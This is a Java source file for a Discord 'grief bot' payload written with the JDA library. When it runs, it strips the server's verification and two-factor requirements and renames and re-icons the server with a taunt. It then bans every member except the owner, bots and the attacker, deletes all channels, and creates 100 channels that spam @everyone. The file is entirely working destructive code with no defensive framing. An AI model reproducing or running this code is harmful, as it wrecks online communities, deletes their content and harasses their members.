package de.corruptedbytes;

import java.nio.charset.StandardCharsets;
import java.util.Base64;

import de.corruptedbytes.utils.Config;
import de.corruptedbytes.utils.Shelv;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Icon;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.TextChannel;
import net.dv8tion.jda.api.entities.User;
import net.dv8tion.jda.api.entities.Guild.MFALevel;
import net.dv8tion.jda.api.entities.Guild.VerificationLevel;

public class GriefBotPayload {

	private Guild guild;
	private User user;

	public GriefBotPayload(Guild guild, User user) {
		this.guild = guild;
		this.user = user;
	}

	public void startGrief() throws Exception {
		String name = String.format(GriefBot.getInstance().getGriefMessage(), user.getName());
		guild.getManager().setVerificationLevel(VerificationLevel.NONE).queue();
		guild.getManager().setName(name).queue();
		guild.getManager().setRequiredMFALevel(MFALevel.NONE).queue();
		guild.getManager().setDescription(name).queue();
		guild.getManager().reason(name).queue();
		guild.getManager().setIcon(Icon.from(Config.GRIEF_PICTURE)).queue();

		for (Member member : guild.getMembers()) {
			if (!(member.isOwner() || member.getUser().isBot()
					|| member.getId() == GriefBot.getInstance().getGrieferUserID())) {
				member.getGuild().ban(member, 0, "bruh").queue();
			}
		}

		guild.getChannels().forEach(key -> {
			key.delete().queue();
		});

		TextChannel base = guild
				.createTextChannel(new String(Base64.getDecoder().decode(Shelv.ASCII_EMOJI), StandardCharsets.UTF_8))
				.complete();
		base.sendMessage(new String(Base64.getDecoder().decode(Shelv.ASCII_MEME), StandardCharsets.UTF_8)).queue();

		for (int i = 0; i < 100; i++) {
			try {
				TextChannel grief = guild.createTextChannel(name.toLowerCase()).complete();

				EmbedBuilder embed = new EmbedBuilder();
				embed.setThumbnail("attachment://FUCKED.PNG");
				embed.setTitle(GriefBot.getInstance().getSpamMessage());
				embed.setDescription("**" + GriefBot.getInstance().getSpamMessage() + "**");
				embed.setFooter(name);
				grief.sendMessage("@everyone").addFile(Config.GRIEF_PICTURE, "FUCKED.PNG").embed(embed.build()).queue();
			} catch (Exception ignored) {
			}
		}
		guild.getManager().reason(name).queue();
	}

}
